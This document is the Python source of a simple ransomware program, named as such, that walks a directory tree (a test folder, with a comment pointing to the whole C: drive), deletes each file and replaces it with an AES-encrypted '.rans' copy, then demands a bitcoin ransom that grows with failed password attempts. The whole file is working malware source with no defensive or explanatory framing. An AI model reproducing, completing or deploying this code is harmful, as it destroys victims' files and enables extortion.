from typing import List
import pyaes # type: ignore
import os
import configparser


class Ransomware(object):
   def __init__(self, /) -> None:
      self.encrypted_file_extension: str = ".rans"
      # starts_in = C:\\
      self.starts_in: str = "C:\\Users\\Laerson\\Desktop\\teste"
      self.ignore_paths: List[str] = ["C:\\Windows"]
      self.password: bytes = b"1ab2c3e4f5g6h7i8"
      self.aes: pyaes.aes.AESModeOfOperationCTR = pyaes.AESModeOfOperationCTR(self.password)
      self.config = ConfigurationFile()
      
   
   def encrypt(self, paths: List[str], /) -> None:
      for path in paths:
         if not path.endswith(self.encrypted_file_extension):
            with open(path, "rb") as f:
               file_data: bytes = f.read()
            try:
               os.remove(path)
               encrypted_filename: str = path.split("\\")[-1] + self.encrypted_file_extension
               current_path: str = "C:\\" + os.path.join(*path.split("\\")[1:-1])
               with open(os.path.join(current_path, encrypted_filename), "wb") as f:
                  f.write(self.aes.encrypt(file_data))
            except Exception:
               pass


   def decrypt(self, paths: List[str], password: bytes, /) -> bool:
      for path in paths:
         with open(path, "rb") as f:
            file_data: bytes = f.read()
         try:
            os.remove(path)
            d: pyaes.aes.AESModeOfOperationCTR = pyaes.AESModeOfOperationCTR(password)
            decript_data: bytes = d.decrypt(file_data)
            filename: str = path.split(self.encrypted_file_extension)[0]
            with open(filename, "wb") as f:
               f.write(decript_data)
         except Exception as e:
            return False
      return True
            
   
   def catch_files_path(self, /) -> List[str]:
      paths: List[str] = []
      for path, _, files in os.walk(self.starts_in):
         if path not in self.ignore_paths:
            for file in files:
               paths.append(os.path.join(path, file))
      return paths
   
   
   def show_message(self, /) -> None:
      print("Your files have been encrypted!")
      print(f"Rescue: {str(self.config.get_bitcoins())} bitcoins!")
      
      
   def get_password(self, /) -> bytes:
      while True:
         self.show_message()
         password: str = str(input("Enter the password to decrypt: "))
         if password.encode() == self.password:
            return password.encode()
         attempts: int = self.config.get_attempts()
         if ((attempts + 1) % 3) == 0:
            bitcoins: int = int((attempts + 1) / 3)
            self.config.set_bitcoins(bitcoins = bitcoins + 1)
            self.config.set_attempts(attempts = attempts + 1)
         else:
            self.config.set_attempts(attempts = attempts + 1)

   
   def start(self, /) -> None:
      is_encrypted: bool = self.config.get_is_encrypted()
      if is_encrypted:
         password: bytes = self.get_password()
         if password:
            paths: List[str] = self.catch_files_path()
            is_decrypted: bool = self.decrypt(paths, password)
            if is_decrypted:
               os.remove(self.config.__file__())
      else:
         paths: List[str] = self.catch_files_path()
         self.encrypt(paths)
         self.config.generate_configuration_file()
         self.start()
               
   
class ConfigurationFile(object):
   def __init__(self, /) -> None:
      self.config_file: str = "config.ini"
      self.config: configparser.ConfigParser = configparser.ConfigParser()
      
      
   def __file__(self, /) -> str:
      current_folder: str = __file__.split("\\ransomware.py")[0]
      return os.path.join(current_folder, self.config_file)
   
   
   def generate_configuration_file(self, /) -> None:
      self.config['DEFAULT'] = {'is_encrypted': True, 'attempts': 0, 'bitcoins': 1}
      with open(self.config_file, 'w') as conf:
         self.config.write(conf)
         
   
   def get_is_encrypted(self, /) -> bool:
      try:
         self.config.read(self.config_file)
         return bool(self.config['DEFAULT']['is_encrypted'])
      except Exception:
         pass
         
         
   def get_attempts(self, /) -> int:
      try:
         self.config.read(self.config_file)
         return int(self.config['DEFAULT']['attempts'])
      except Exception:
         pass


   def get_bitcoins(self, /) -> int:
      try:
         self.config.read(self.config_file)
         return int(self.config['DEFAULT']['bitcoins'])
      except Exception:
         pass
   
   
   def set_is_encrypted(self, /, *, encrypted: bool) -> bool:
      try:
         self.config['DEFAULT'] = {'is_encrypted': encrypted, 'attempts': self.get_attempts(), 'bitcoins': self.get_bitcoins()}
         with open(self.config_file, 'w') as conf:
            self.config.write(conf)
         return True
      except Exception:
         return False
   
   
   def set_attempts(self, /, *, attempts: int) -> bool:
      try:
         self.config['DEFAULT'] = {'is_encrypted': self.get_is_encrypted(), 'attempts': attempts, 'bitcoins': self.get_bitcoins()}
         with open(self.config_file, 'w') as conf:
            self.config.write(conf)
         return True
      except Exception:
         return False
   
   
   def set_bitcoins(self, /, *, bitcoins: int) -> bool:
      try: 
         self.config['DEFAULT'] = {'is_encrypted': self.get_is_encrypted(), 'attempts': self.get_attempts(), 'bitcoins': bitcoins}
         with open(self.config_file, 'w') as conf:
            self.config.write(conf)
         return True
      except Exception:
         return False

   
if __name__ == "__main__":
   rans: Ransomware = Ransomware()
   rans.start()